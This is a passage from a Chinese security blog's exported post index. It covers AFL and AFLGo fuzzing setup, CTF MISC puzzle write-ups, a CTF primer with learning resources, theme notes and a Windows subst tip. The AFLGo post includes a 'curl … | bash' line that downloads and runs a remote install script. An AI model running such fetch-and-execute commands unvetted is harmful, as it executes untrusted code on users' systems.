[{"title":"AFL简介与使用","url":"/2020/08/25/AFL%E7%AE%80%E4%BB%8B%E4%B8%8E%E4%BD%BF%E7%94%A8/","content":"模糊测试（Fuzzing）技术作为漏洞挖掘最有效的手段之一，近年来一直是众多安全研究人员发现漏洞的首选技术。  AFL、LibFuzzer、honggfuzz等操作简单友好的工具相继出现，也极大地降低了模糊测试的门槛。 \n\nAFL即American Fuzzy Lop，是由安全研究员Micha · Zalewski（@lcamtuf）开发的一款基于覆盖引导（Coverage-guided）的模糊测试工具，采用一种新型的编译时插桩和遗传算法来自动生成测试样本，使用这些样本可触发目标二进制程序中新的内部状态，从而可提高模糊测试的代码覆盖率。\n1 AFL工作流\nAFL工作的基本流程如图所示：\n\n从源码编译程序时进行插桩，以记录代码覆盖率（Code Coverage） \n选择一些输入文件，作为初始测试集加入输入队列（queue） \n将队列中的文件按一定的策略进行“突变” （Mutation）\n如果经过变异文件更新了覆盖范围，则将其保留添加到队列中 \n上述过程会一直循环进行，期间触发了crash的文件会被记录下来 \n\nafl-fuzz 会记录触发crash的cmdline以便研究者手动复现和gdb调试分析。\n2 代码插桩 在AFL编译文件时候afl-gcc会在规定位置插入桩代码，可以理解为一个个的探针(但是没有暂停功能)，在后续fuzz的过程中会根据这些桩代码进行路径探索，测试等。对于插桩的理解也可以这样理解，如下图： \n3 构建语料库使用AFL进行模糊测试的对象一定是具备接收输入的程序，也正是这样的程序有更大可能出现漏洞。\n AFL需要一些初始输入数据（也叫种子文件）作为Fuzzing的起点，AFL可以通过启发式算法自动确定文件格式结构。lcamtuf就在博客中给出了一个有趣的例子——对djpeg进行Fuzzing时，仅用一个字符串”hello”作为输入，最后凭空生成大量jpeg图像！\n尽管AFL的输入可以是毫无意义的文件，但是一个高质量的语料库，能够让Fuzzing更加高效和精准。\n3.1 对输入种子的要求\n有效的输入：无效的输入会产生bug和crash，但是有效的输入能够更快找到更多的执行路径\n尽量小的体积： 较小的文件会不仅可以减少测试和处理的时间，也能节约更多的内存，AFL给出的建议是最好小于1 KB，但其实可以根据自己测试的程序权衡，这在AFL文档的perf_tips.txt中有具体说明。 \n\n3.2 如何寻找输入种子\n项目自身提供的测试用例\n目标程序bug提交页面\n使用格式转换器，将现有格式文件转换为不常见的文件格式\nAFL源码仓库的testcases目录下提供了测试用例\n其他大型语料库：\nafl generated image test sets \nfuzzer-test-suite\nlibav samples\nffmpeg samples\nfuzzdata\nmoonshine\n\n\n\n3.3 如何精简找到的种子 AFL提供了两个工具来帮助我们完成语料库蒸馏工作——afl-cmin和afl-tmin。 \n\n移除执行相同代码的输入文件——afl-cmin:\n\nafl-cmin的核心思想是：尝试找到与语料库全集具有相同覆盖范围的最小子集。举个例子：假设有多个文件，都覆盖了相同的代码，那么就丢掉多余的文件。其使用方法如下： \n$ afl-cmin -i input_dir -o output_dir -- /path/to/tested/program [params] @@\n\n\n\n减小单个输入文件的大小——afl-tmin:\n\n在缩减了语料库规模之后，还需要对单个语料文件进行精简。afl-tmin有两种工作模式，instrumented mode和crash mode。默认的工作方式是instrumented mode，如下所示（如果指定了参数-x，即crash mode，会把导致程序非正常退出的文件直接剔除。 ）： \n$ afl-tmin [-x] -i input_file -o output_file -- /path/to/tested/program [params] @@\n\nafl-tmin接受单个文件输入，所以可以用一条简单的shell脚本批量处理：\nfor i in *do    afl-tmin -i $i -o tmin-$i -- ~/path/to/tested/program [params] @@done\n\n\n\n使用完afl-tmin后再次使用afl-cmin，可能可以再过滤掉一些用例\n\n\n4 Mutation突变策略AFL的突变策略十分丰富，它能够尽可能地保证输入种子充分地变异，以追求更大的执行路径覆盖率，从而测试出更多的crash。AFL的突变策略依次包括：bitflip，arithmetic，interest，dictionary，havoc和splice。\n4.1 bitflip4.1.1 基础bitflip\n基本原理： 按位翻转，1变为0，0变为1。AFL会采用不同的翻转长度和步长来进行位翻转，顺序如下：\nbitflip 1/1，2/1，4/1，8/8，16/8，32/8\nbitflip m/n即每次翻转m个bit，按照n个bit的步长从文件头部开始翻转\nAFL还有一些对文件格式启发式的判断，如自动检测token和生成effector map\n\n\n举例：对某jpeg格式的文件从其头部FF D8...开始进行bitflip\n第一次bitflip 1/1：7F D8，第二次bitflip 1/1：BF D8，第三次bitflip 1/1：DF D8，第四次bitflip 1/1：EF D8\n\n\n\n4.1.2 自动检测token\n基本原理： 如果连续多个bytes的最低位被翻转后，程序的执行路径都未变化，而且与原始执行路径不一致  ，那么就把这一段连续的bytes判断是一条token。\n举例：PNG文件中用...IHDR...作为起始块的标识，当翻转到最高位字节的时候，由于IHDR被破坏，程序执行路径发生改变，随后在翻转接下来的三个字节的时候IHDR同样被破坏，程序会采取相同的执行路径。由此AFL就判断得到了一个可能的token：IHDR，并将其记录为后续的变异提供备选。\n\n4.1.3 生成effector map\n基本原理：在执行bitflip 8/8，即对每个字节进行翻转时，如果执行路径发生了改变，则将该byte在effector map中标记为1，反之标记为0。其逻辑为如果翻转一个byte都无法带来程序执行路径的改变，则该byte很有可能是属于data而非metadata(如size，flag等)，对fuzzing的意义不大，在之后的变异里会参考effector map跳过那些”无效”的bytes。\n说明：在以下三种情况下，AFL不会判定有效字符：\nAFL工作模式为dumb mode或者Slave mode即（静默模式和从模式）\n如果文件大小小于128bytes，则默认所有字节均为”有效”字节\n如果文件被标记为”有效”的字节超过了90%，则默认所有字节均为”有效”字节\n\n\n\n4.2 arithmeticbitflip策略全部突变完毕后，进入到arithmetic突变阶段。arithmetic阶段会根据目标大小的不同，分为了一下几个子阶段：\n\n基本原理：arith 8/8，arith 16/8，arith 32/8。其含义为每次对8，16，32bits进行加减运算，按照每8个bits的步长从文件头开始，即对文件的每个byte，word，dword进行整数加减变异。\n说明：\n加减变异运算的上限在config.h中的宏ARITH_MAX定义，默认为35，即进行 ±1，±2，…，±35的运算变异\nAFL会考虑整数的大端序和小端序形式，并以这两种方式分别进行变异\nAFL会跳过effector map中标记为”无效”的bytes，以及之前bitflip阶段已经生成过的变异(比如加减某个数之后产生的效果和之前bitflip的某次变异一样)\n\n\n\n4.3 interest4.4 dictionary4.5 havoc4.6 splice5 AFL安装与使用5.1 源码安装采用源码安装AFL：\n# 从github下载最新的release v2.57bwget https://github.com/google/AFL/archive/v2.57b.tar.gz -O afl-2.57b.tar.gz# 官网自2017年11月就没有再更新，latest version 为2.52b# wget http://lcamtuf.coredump.cx/afl/releases/afl-latest.tgz -O afl-2.52b.tar.gztar xvzf afl-2.57b.tar.gzcd afl-2.57b# make &amp;&amp; make installsudo make &amp;&amp; sudo make install\n 安装完成后，afl-*等二进制文件默认在/usr/local/bin/目录下 ，添加其到环境变量PATH即可\n\n出于研究的考虑，环境中很可能不止一种fuzzer，因此不建议make install，用绝对路径使用即可\n\n5.2 插桩与Fuzzing\n使用afl-gcc/afl-g++进行插桩：\n\n# 进入待测程序目录，指定CC/CXX。注意需要提前创建/PATH/TO/BUILD安装目录cd /PATH/TO/PROGRAMCC=/PATH/TO/afl-gcc CXX=/PATH/TO/afl-g++ ./configure --prefix=/PATH/TO/BUILDmake -j &amp;&amp; sudo make install\n\n也可以使用llvm_mode进行插桩：\n\n# 编译afl-clang-fastcd llvm_mode &amp;&amp; make# 插桩cd /PATH/TO/PROGRAMCC=/PATH/TO/afl-clang-fast CXX=/PATH/TO/afl-clang-fast++ ./configure --prefix=/PATH/TO/BUILDmake -j &amp;&amp; sudo make install\n\n创建Fuzz的工作目录，开始Fuzz\n\n# 我个人比较喜欢的目录结构如下├─fuzz-PROGRAM    ├─bin      # 使用bin/PROGRAM而不是PROGRAM可以避免在PATH中搜索    ├─in       # 存放初始种子    └─out      # Fuzz的输出cd fuzz-PROGRAM/PATH/TO/afl-fuzz -i in -o out bin/PROGRAM [argvs] @@\n5.3 结果分析TO BE COMPLETED\n","categories":["Fuzz"],"tags":["AFL","Fuzz"]},{"title":"【CTF例题分析】MISC杂项(一)","url":"/2019/10/15/CTF%E4%BE%8B%E9%A2%98%E5%88%86%E6%9E%90-MISC%E6%9D%82%E9%A1%B9-%E4%B8%80/","content":"CTF例题分析系列，MISC杂项方向(一)。本篇文章主要讲解三道从易到难的MISC方向的题目。目的在于让大家能够了解CTF的MISC类型的冰山一角。QAQ\n1 一道练手的题目 \n今天是菜小狗的生日，他收到了一个Linux系统光盘。\n\n要求拿到flag，提交格式为flag&#123;The_String_of_Flag&#125;\n附件下载地址\n\n\n\n下载附件，发现该文件名很长，首先怀疑是否flag藏在文件名里（后觉此想法极其稚嫩）\n\n发现无法解码，便老老实实按照题目所期望的方向解题\n\n查看文件类型，发现是一个Linux rev 1.0 ext3 filesystem data 类型的文件。\n\n\n\n（WSL无法正常使用mount）尝试挂载该文件系统，但是得到is not a block device 错误提示\n\n\n\n使用mount -o loop  挂在环回文件系统到./mnt/ 目录\n查找flag相关的文件，可以看到有一个名为flag.txt 的文件，查看其内容。\n\n\n\n字符串各个字符均为ASCII码可打印字符，且字符串以 = 结尾，怀疑是Base64编码，于是解码得到最终flag\n\n\n注：关于上面提到Base64编码的猜测，可以参考我这一篇笔记 Base编码家族)\n2 一道有点难度的题目 \n今天菜小狗为了打败菜小猫，学了一套如来十三掌\n\n要求拿到flag，提交格式为`flag{The_String_of_Flag}\n附件下载链接\n\n\n下载附件发现是一个docx文档，其中有一段佛语…\n\n\n对于与佛论禅系列的加解密，我暂时没有深入了解，且先使用蓝色的风之精灵制作的与佛论禅加解密在线工具将该密文解密\n\n\n得到依旧是加过密的字符串MzkuM3gvMUAwnzuvn3cgozMlMTuvqzAenJchMUAeqzWenzEmLJW9\n\n由于每一个字符均为base64字符集的可打印字符，所以猜测是否是经过Base64加过密的。然而使用Base家族解密工具根本无法成功解密。说明应该由另一种加密算法加过密的。由于加密串仍然为ASCII可编码打印的常规字符，遂尝试rot-13加解密算法\n\n\n\n编写脚本，解密该字符串，注意rot-13加密算法无论加还是减结果都一样。\n\n\n\n最后送给Base64解码，得到flag\n\n\n3 一道有点复杂的题目题目附件: 链接\n\n这是一道特别绕的题目\n\n\n解压附件，得到 欢迎来到地狱 的文件夹\n\n\n\n首先打开地狱伊始.jpg，发现图片格式不正确\n\n\n\n用winhex打开该图片的字节码，发现文件头部有缺失，缺少文件的前4个字节信息\n\n\n\n在文件头部添加4个字节的内容 FFD8 FFE0, 图片修复成功，得到以下内容：\n\n\n下载网盘资源文件：地狱之声.wav\n\n\n\n\n根据波形图的变化，猜测是摩尔斯电码-.- . -.-- .-.. . - ..- ... --. ---\n\n译码得到keyletusgo\n\n打开第二层地狱.docx，有一张图片和一些文字，但是看不出来有什么有价值的信息。于是打开word设置中的显示隐藏文字，得到提示“图片采用了隐写技术”\n\n\n\n\n使用隐写术加解密在线工具aTool，得到压缩文件的解压密码\n\n\n\n压缩文件夹打开后得到一张图片和一个文本文档，文本文档中的bit序列直接ASCII编码得到字符串“ruokouling”\n\n\n迷惑！此题的后续文件似乎丢失了，所以这一题的分析就到这里。\n这一道题并不是很官方，但也能以此看出CTF的题目有时需要很大的脑回路。\n望诸君共勉\n","categories":["CTF"],"tags":["CTF"]},{"title":"Fluid主题样式备忘录","url":"/2020/07/15/Fluid%E4%B8%BB%E9%A2%98%E6%A0%B7%E5%BC%8F%E5%A4%87%E5%BF%98%E5%BD%95/","content":"Hexo Fluid是一款兼具美观和实用的博客主题。本文用于记录其常用样式的用法，包括脚注，\n\n1 脚注主题内置了脚注语法支持，可以在文章末尾自动生成带有锚点的脚注，该功能在主题配置中默认开启：\npost:  footnote:    enable: true    header: &#x27;&#x27;\n参考配置指南1，可知脚注语法如下：\n这是一句话[^1][^1]: 这是对应的脚注\n更优雅的使用方式，是将脚注写在文末，比如：\n正文## 参考[^1]: 参考资料1[^2]: 参考资料2\n2 Tag插件2.1 便签在 markdown 中加入如下的代码来使用便签：\n&#123;% note success %&#125;文字 或者 `markdown` 均可&#123;% endnote %&#125;\n或者使用 HTML 形式：\n&lt;p class=&quot;note note-primary&quot;&gt;标签&lt;/p&gt;\n可选便签：success, danger, warning, primary, secondary, info, light\nsuccess\ndanger\nwarning\nprimary\nsecondary\ninfo\nlight\n2.2 行内标签在 markdown 中加入如下的代码来使用 Label：\n&#123;% label primary @text %&#125;\n或者使用 HTML 形式：\n&lt;span class=&quot;label label-primary&quot;&gt;Label&lt;/span&gt;\n可选 Label：\nprimary default info success warning danger \n2.3 勾选框在 markdown 中加入如下的代码来使用 Checkbox：\n&#123;% cb text, checked?, incline? %&#125;\ntext：显示的文字checked：默认是否已勾选，默认 falseincline: 是否内联（可以理解为后面的文字是否换行），默认 false\n2.4 按钮你可以在 markdown 中加入如下的代码来使用 Button：\n&#123;% btn url, text, title %&#125;\n或者使用 HTML 形式：\n&lt;a class=&quot;btn&quot; href=&quot;url&quot; title=&quot;title&quot;&gt;text&lt;/a&gt;\nurl：跳转链接text：显示的文字title：鼠标悬停时显示的文字（可选）\ntag-插件用法\n2.5 组图如果想把多张图片按一定布局组合显示，你可以在 markdown 中按如下格式：\ntotal：图片总数量，对应中间包含的图片 url 数量n1-n2-…：每行的图片数量，可以省略，默认单行最多 3 张图，求和必须相等于 total，否则按默认样式\n参考\n1. Fluid配置指南 &#8617;\n\n","categories":["Configuration"],"tags":["Blog","Theme"]},{"title":"CTF入门","url":"/2019/10/14/CTF%E5%85%A5%E9%97%A8/","content":"1 CTF简介CTF（Capture The Flag）中文一般译作夺旗赛，在网络安全领域中指的是网络安全技术人员之间进行技术竞技的一种比赛形式。CTF起源于1996年DEFCON全球黑客大会，以代替之前黑客们通过互相发起真实攻击进行技术比拼的方式。发展至今，已经成为全球范围网络安全圈流行的竞赛形式，而DEFCON作为CTF赛制的发源地，DEFCON CTF也成为了目前全球最高技术水平和影响力的CTF竞赛，类似于CTF赛场中的“世界杯” 。\n\n2 CTF比赛模式2.1 解题模式(Jeopardy)在解题模式CTF赛制中，参赛队伍可以通过互联网或者现场网络参与，这种模式的CTF竞赛与ACM编程竞赛、信息学奥赛比较类似，以解决网络安全技术挑战题目的分值和时间来排名，通常用于在线选拔赛。\n不同的是这个解题模式一般会设置 一血 、 二血 、 三血 ，也即最先完成的前三支队伍会获得额外分值，所以这不仅是对首先解出题目的队伍的分值鼓励，也是一种团队能力的间接体现。\n当然还有一种流行的计分规则是设置每道题目的初始分数后，根据该题的成功解答队伍数，来逐渐降低该题的分值，也就是说如果解答这道题的人数越多，那么这道题的分值就越低。最后会下降到一个保底分值后便不再下降。\n题目类型主要包含 Web 网络攻防 、 RE 逆向工程 、 Pwn 二进制漏洞利用 、 Crypto 密码攻击 、 Mobile 移动安全 以及 Misc 安全杂项 这六个类别。\n举例，比如 \n2.2 攻防模式(Attack and Defense)2.2.1 概述攻防模式常见于线下决赛。在攻防模式中，初始时刻，所有参赛队伍拥有相同的系统环境（包含若干服务，可能位于不同的机器上），常称gamebox，参赛队伍挖掘网络服务漏洞并攻击对手服务获取 flag 来得分，修补自身服务漏洞进行防御从而防止扣分（一般来说防御只能避免丢分，当然有的比赛在防御上可以得分）\n攻防模式CTF赛制可以实时通过得分反映出比赛情况，最终也以得分直接分出胜负，是一种竞争激烈，具有很强观赏性和高度透明性的网络安全赛制。在这种赛制中，不仅仅是比参赛队员的智力和技术，也比体力（因为比赛一般都会持续48小时及以上），同时也比团队之间的分工配合与合作。\n一般比赛的具体环境会在开赛前一天或者当天开赛前半小时由比赛主办方给出（是一份几页的小文档）。在这一段时间内，你需要根据主办方提供的文档熟悉环境并做好防御。\n在比赛开始前半小时，这半小时内是无法进行攻击的，各支队伍都会加紧熟悉比赛网络环境，并做好防御准备。至于敌方 Gamebox 的 IP 地址，则需要靠你自己在给出网段中发现。\n如果是分为上午下午两场攻防赛的话，那么上午和下午的 Gamebox 漏洞服务会更换（避免比赛中途休息时选手交流），但管理时要用的 IP 地址等信息不会改变。也就是 下午会换新题 。\n一般情况下，主办方会提供网线，但并不会提供网线转接口，所以需要自备。\n2.2.2 基本规则攻防模式一般的规则如下\n\n战队初始分数均为 x 分\n比赛以 5/10 分钟为一个回合，每回合主办方会更新已放出服务的 Flag\n每回合内，一个战队的一个服务被渗透攻击成功（被拿 Flag 并提交），则扣除一定分数，攻击成功的战队平分这些分数。\n每回合内，如果战队能够维护自己的服务正常运行，则分数不会减少（如果防御成功加分则会加分）；\n如果一个服务宕机或异常无法通过测试，则可能会扣分，服务正常的战队平分这些分。往往服务异常会扣除较多的分数。\n如果该回合内所有战队的服务都异常，则认为是不可抗拒因素造成，分数都不减少。\n每回合内，服务异常和被拿 Flag 可以同时发生，即战队在一个回合内单个服务可能会扣除两者叠加的分数。\n禁止队伍使用通用防御方法\n请参赛队伍在比赛开始时对所有服务进行备份，若因自身原因导致服务永久损坏或丢失，无法恢复，主办方不提供重置服务\n禁止对赛题以外的比赛平台发起攻击，包括但不限于在 gamebox 提权 root、利用主办方平台漏洞等，违规者立刻被取消参赛资格\n参赛队伍如果发现其他队伍存在违规行为，请立刻举报，主办方会严格审核并作出相应判罚。\n\n2.2.3 网络环境文档上一般都会有比赛环境的 网络拓扑图 （如下图），每支队伍会维护若干的 Gamebox（己方服务器） ，Gamebox 上部署有存在漏洞的服务。\n\n文档上会包括选手，攻防环境，主办方三者的环境。\n选手需要在个人电脑上配置或者 DHCP 自动获取\n\nIP 地址\n网关\n掩码 DNS 服务器地址\n\n攻防环境\n\nGamebox 所处地址，包括己方和其他队伍的地址。\n比赛一般会提供队伍的 id 与对应 ip 的映射表，以便于让选手指定恰当的攻防策略。\n\n主办方环境\n\n比赛答题平台\n提交 flag 接口\n流量访问接口\n\n2.2.4 访问 Gamebox参赛文档中会给出队伍登录 gamebox 的方式，一般来说如下\n\n用户名为 ctf\n一般会通过 ssh 登录，登录方式为密码或者私钥。\n\n自然，在登录上战队机器后应该修改所有的默认密码，同时不应该设置弱密码。\n2.2.5 比赛的一些策略\n在比赛过程中，不宜死耗在一道题上，由于一血的优势性，在比赛过程中更应该全面了解赛题难度，先从 简单题 开始进行分析，步步为营。\n比赛过程中，两极会严重分化。应该着力打击和自己实力相当和比自己队伍更强的队伍，尤其是分数相差无几的情况下，更要严防严守。\n比赛中 NPC 会不定时发出攻击流量。从攻击流量中可以得到 payload。\n一定要把 NPC 往死里打。\n在开赛初可以将所有的管理密码都设置为同一个密码，这样方便队员登录管理。在初期将所有文件备份下来供队内分享。\n\n2.3 混合模式(Mix)结合了解题模式与攻防模式的CTF赛制，比如参赛队伍通过解题可以获取一些初始分数，然后通过攻防对抗进行得分增减的零和游戏，最终以得分高低分出胜负。采用混合模式CTF赛制的典型代表如iCTF国际CTF竞赛。\n2.4 战争分享模式(Belluminar)2.4.1 赛制介绍如官网介绍这样，BELLUMINAR CTF 赛制由受邀参赛队伍相互出题挑战，并在比赛结束后分享赛题的出题思路，学习过程以及解题思路等。战队评分依据出题得分，解题得分和分享得分，进行综合评价并得出最终的排名。\n2.4.2 出题阶段首先各个受邀参赛队伍都必须在正式比赛前出 2 道 Challange。参赛队伍将有 12 周的时间准备 Challenge。出 Challenge 的积分占总分的 30%。\n传统的 BELLUMINAR 赛制要求出的两道 Challenge 中一道 Challenge 必须是在 Linux 平台，另外一个 Challenge 则为非 Linux 平台。两个 Challenge 的类型没有做出限制。因此队伍可以尽情展现自己的技术水平。\n为使比赛 Challenge 类型比较均衡，也有采用队伍抽签出 Challenge 的方式抽取自己的 Challenge，这要求队伍能力水平更为全面，因此为了不失平衡性，也会将两道 Challenge 的计入不同分值（比如要求其中一道 Challenge 分值为 200，而另外一道分值则为 100）。\n2.4.3 提交部署题目提交截止之前，各个队伍需要提交完整的文档以及解题 Writeup，文档中要求详细标明题目分值，题面，出题负责人，考察知识点列表以及题目源码。而解题 Writeup 中则需要包含操作环境，完整解题过程以及解题代码。\n题目提交之后主办方会对题目和解题代码进行测试，如果期间出现问题则需要该题负责人配合以解决问题。最终放到比赛平台上。\n2.4.4 解题竞技进入比赛后，各支队伍可以看到所有其他团队出的题目并发起挑战，但是不能解答本队出的题目，不设 First Blood 奖励，根据解题积分进行排名。解题积分占总分的 60%。\n比赛结束后，队伍休息，并准备制作分享 PPT（也可以在出题阶段准备好）。分享会时，各队派 2 名队员上台分享出题解题思路，学习过程以及考察知识点等。\n2.4.5 计分规则出题积分（占总分 30%）有 50% 由评委根据题目提交的详细程度，完整度，提交时间等进评分，另外 50% 则根据比赛结束后的最终解题情况进行评分。计分公式示例： Score = MaxScore — | N — Expect＿N | 。N 代表解出该题的队伍数量，而 Expect＿N 则是这道题预期解出的题目数量。只有当题目难度适中，解题队伍数量越接近预期数量 Expect＿N，则这道题的出题队伍得到的出题积分越高。\n解题积分（占总积分 60%）在计算时不考虑 First Blood 奖励。\n分享积分（占 10%）由评委和其他队伍根据其技术分享内容进行评分得出（考虑分享时间以及其他限制），会计算平均值。\n3 CTF各大题型简介3.1 MISC(安全杂项)全称Miscellaneous。题目涉及流量分析、电子取证、人肉搜索、数据分析、大数据统计等等，覆盖面比较广。我们平时看到的社工类题目；给你一个流量包让你分析的题目；取证分析题目，都属于这类题目。主要考查参赛选手的各种基础综合知识，考察范围比较广。\n3.2 REVERSE(逆向)题目涉及到软件逆向、破解技术等，要求有较强的反汇编、反编译扎实功底。需要掌握汇编，堆栈、寄存器方面的知识。有好的逻辑思维能力。主要考查参赛选手的逆向分析能力。此类题目也是线下比赛的考察重点。\n3.3 WEB(web类)WEB应用在今天越来越广泛，也是CTF夺旗竞赛中的主要题型，题目涉及到常见的Web漏洞，诸如注入、XSS、文件包含、代码审计、上传等漏洞。这些题目都不是简单的注入、上传题目，至少会有一层的安全过滤，需要选手想办法绕过。且Web题目是国内比较多也是大家比较喜欢的题目。因为大多数人开始安全都是从web日站开始的。\n3.4 PWN(溢出)PWN在黑客俚语中代表着攻破，取得权限，在CTF比赛中它代表着溢出类的题目，其中常见类型溢出漏洞有栈溢出、堆溢出。在CTF比赛中，线上比赛会有，但是比例不会太重，进入线下比赛，逆向和溢出则是战队实力的关键。主要考察参数选手漏洞挖掘和利用能力。\n3.5 CRYPTO(密码学)全称Cryptography。题目考察各种加解密技术，包括古典加密技术、现代加密技术甚至出题者自创加密技术。实验吧“角斗场”中，这样的题目汇集的最多。这部分主要考查参赛选手密码学相关知识点。\n3.6 STEGA(隐写)全称Steganography。题目的Flag会隐藏到图片、音频、视频等各类数据载体中供参赛选手获取。载体就是图片、音频、视频等，可能是修改了这些载体来隐藏flag，也可能将flag隐藏在这些载体的二进制空白位置。有时候需要你侦探精神足够的强，才能发现。此类题目主要考查参赛选手的对各种隐写工具、隐写算法的熟悉程度。实验吧“角斗场”的隐写题目是比较全的，以上说到的都有涵盖。新手们可以从此入门。\n3.7 PPC(编程类)全称Professionally Program Coder。题目涉及到程序编写、编程算法实现。算法的逆向编写，批量处理等，有时候用编程去处理问题，会方便的多。当然PPC相比ACM来说，还是较为容易的。这部分主要考察选手的快速编程能力。\n4 CTF分工合作常规方向\n\nA方向：PWN + RE + CRYPTO\nB方向：WEB + STEGA + MISC\n\nMISC，PPC 所有人都需要有一个基本的了解和掌握\n\n\n5 CTF学习参考5.1 知识地图\n5.2 参考书籍\nA方向：\n逆向工程核心原理\n恶意代码分析实战\nRE for Beginners\nIDA Pro权威指南\n加密与解密\n\n\nB方向：\nWeb应用安全权威指南\n\n\n\n5.3 相关网站5.3.1 学习路线\n知道创宇研发技能表 v3.1\n漏洞银行 (BUGBANK) 技能树\n安全技能树简版 by 余弦\n安全类思维导图 by phith0n\n信息安全从业者书单推荐\n\n5.3.2 在线学习\n攻防世界: 新手入门推荐的刷题网站，包含CTF题型中的大部分\n\ni 春秋 - 专业的网络安全 | 信息安全在线学习培训平台\n\n实验吧－让实验更简单！\n看雪知识库\n\n5.3.3 信息资讯\nFreeBuf.COM | 关注黑客与极客\n安全客 - 有思想的安全新媒体\n嘶吼 RoarTalk – 回归最本质的信息安全\nSec-News 安全文摘\n互联网安全媒体FreeBuf\n知道创宇\n15PB 信息安全教育\nt00ls.net\n\n5.3.4 技术论坛\n吾爱破解\n看雪论坛\n先知社区\ni 春秋论坛\n\n5.3.5 CTF赛事\nXCTF 社区: 全球赛事资讯，积分排名，技术分享\nCTFtime\nCTF Rank\n\n5.3.6 CTF OJ\nXCTF OJ\nCTF 大本营\npwnhub\n南邮网络攻防训练平台\nHackingLab 网络信息安全攻防学习平台\nBugkuCTF\nWeChall\nSniper OJ\nJarvis OJ\nCTF Learn\nHackme CTF\nPractice CTF List\n\n5.3.7 本地靶场\nSQLi: https://github.com/Audi-1/sqli-labs\nDVWA: https://github.com/ethicalhack3r/DVWA\nmetsploitable3: https://github.com/rapid7/metasploitable3/\nWebgoat: https://github.com/WebGoat/WebGoat\nJuiceshop: https://github.com/bkimminich/juice-shop\n\n5.3.8 CTF 工具\n看雪工具\n吾爱破解工具\nCTF 在线工具 by CTFcode\nCTF 在线工具箱 by bugku\nCTF 工具资源库 by HBCTF team\nctf-tools by zardus\nThe Cyber Swiss Army Knife\n\n5.3.9 CTF Writup\nCTFs Writeup 集锦\nCTF solution by p4 team\n\n5.3.10 漏洞复现Vulhub: https://github.com/vulhub/vulhub\n","categories":["Tutorial"],"tags":["CTF"]},{"title":"Invalid Driver Label in Windows","url":"/2019/05/16/Invalid-Driver-Label-on-Windows/","content":"After we change the label of a disk, the Install control programs in the original driver may be inexecutable, with an error of “Invalid Driver X:\\ “\n\nSolutions1.1 RecommendedUsing a DOS-command: subst may solve this problem properly.\nsubst: Assign a driver label to a path(a directory) temporarily. Then the directory can be accessed as the Driver.\n\nsubst [Driver Label] [path to dir], Create a virtual driver on the /path/to/dir.\nsubst [Driver Label] /D, Delete the Created virtual driver.\nsubst, list the current Virtual Driver\n\nwith the help of subst, we could also hide the Real Driver like “D: “ by Creating a homonymous Virtual Driver”D: “\n\n\n1.2 Not RecommendedModify the Driver Label to the required Label according to the error.\nBe Cautious! Remember to change back to the original Driver Label, or you will find the other programs in this Disk are inaccessible.\n","categories":["Tricks"],"tags":["Windows","Virtualization"]},{"title":"AFLGO安装与使用","url":"/2020/10/21/AFLGO%E5%AE%89%E8%A3%85%E4%B8%8E%E4%BD%BF%E7%94%A8/","content":"AFLGO是基于AFL改进而来的一种定向灰盒模糊测试工具。定向Fuzz的鼻祖(之一)。\n\nAFLGo基于llvm实现了函数调用图CG和控制流图CFG的获取，结合对程序CG/CFG定义了一种基于目标distance衡量的种子调度策略，使得Fuzzer能够更快生成可抵达目的位置的测试用例。定向灰盒模糊测试(Directed Greybox Fuzzing)常常用于补丁测试，漏洞复现等等具备特定待测目标的软件测试任务场景。\n1 安装AFLGO\n安装llvm和clang，官方文档要求是3.8或者4.0，经过自己测试6.0和11.0和也可以使用，确保环境$PATH或$LLVM_CONFIG变量已经添加\n执行官方一键安装脚本，此脚本疑似有问题（截止至2020年10月），其中llvm-4.0和clang-4.0会安装失败\n因此依照官方README的流程，我编写了一键安装llvm 12.0.1以及AFLGo的脚本：\n\ncurl https://gitee.com/QGrain/aflgo-build/raw/master/aflgo-build.sh | bash\n\n也可以直接使用我打包好的docker镜像\n\ndocker pull qgrain/aflgo:ubuntu20.04_llvm12.0.1\n2 使用AFLGO可能遇到的问题：\n\n计算distance：gen_distance_fast.py不好用，建议用genDistance.sh。此外如果报错AttributeError: module &#39;networkx&#39; has no attribute &#39;info&#39;，则卸载networkx然后安装低版本\n\npip uninstall networkxpip install networkx==2.2\n3 常见开源库和软件Google已经总结了三百多款常见的开源软件用于模糊测试，每一个工具的目录结构如下：\n\n/PATH/TO/TOOL│─  build.sh│─  Dockerfile│─  project.yaml└─  my-api-repo        │─  do_stuff_fuzzer.cpp        │─  do_stuff_fuzzer.dict        │─  do_stuff_unittest.cpp        │─  Makefile        │─  my_api.cpp        │─  my_api.h        │─  README.md        │─  standalone_fuzz_target_runner.cpp    └─  do_stuff_test_data        │─  410c23d234e7f97a2dd6265eb2909324deb8c13a        │─  7a74862169c3375f4149daff75187cbca7372a38\n\n并不是所有的工具都提供了相关的代码和语料，但是每一款工具都给出了\n\nproject.yaml：记录了项目基本信息，例如：\n\nhomepage: &quot;https://www.gnu.org/software/binutils/&quot;language: c++primary_contact: &quot;bug-binutils@gnu.org&quot;auto_ccs :  - &quot;p.antoine@catenacyber.fr&quot;  - &quot;nickc@redhat.com&quot;  - &quot;amodra@gmail.com&quot;  - &quot;david@adalogics.com&quot;fuzzing_engines:  - libfuzzer  - afl  - honggfuzz  - dataflowsanitizers:  - address  - undefined  - memory  - dataflow\n\nDockerfile：定义实验环境容器\nbuild.sh：用于构建实验环境容器\n\n撰写了一个脚本解析出了所有支持afl引擎的开源工具列表：\n\nbinutils brotli brunsli bzip2c-ares capstone cjson cmarkgraphicsmagick grok harfbuzzhermes hostapjbig2dec json-clcms libcbor libexif libfdk-aac libidn2 libldac libpcap libplist libspectre libtasn1 libteken libwebp libxml2 libyaml libyuv lz4miniz monero mupdfnanopb ndpi nestegg nghttp2 ntpopenjpeg openthread opus otspcre2 pffft proxygenqubes-osrnpspeex stbtidy-html5 tor tremorunicorn usrsctpvorbiswireshark woff2 wolfssl wuffsxzyajl-rubyzlib zlib-ng zstd\n\n然后选取了其中较为常用，轻量级的几款工具来做AFLGO Fuzzing测试\n3.1 bzip2\n介绍： bzip2是一款比传统的gzip或者ZIP的压缩效率更高但是压缩速度较慢的压缩工具，其算法可以排名到前百分之十到十五。 \n源码地址： https://sourceware.org/git/bzip2.git\noss-fuzz项目地址：https://github.com/google/oss-fuzz/tree/master/projects/bzip2\n\n3.2 binutils\n介绍： binutils 是一组开发工具，包括连接器，汇编器和其他用于目标文件和档案的工具。 \n源码地址：https://github.com/bminor/binutils-gdb\noss-fuzz项目地址：https://github.com/google/oss-fuzz/tree/master/projects/binutils\n\n3.3 cJSON\n介绍： 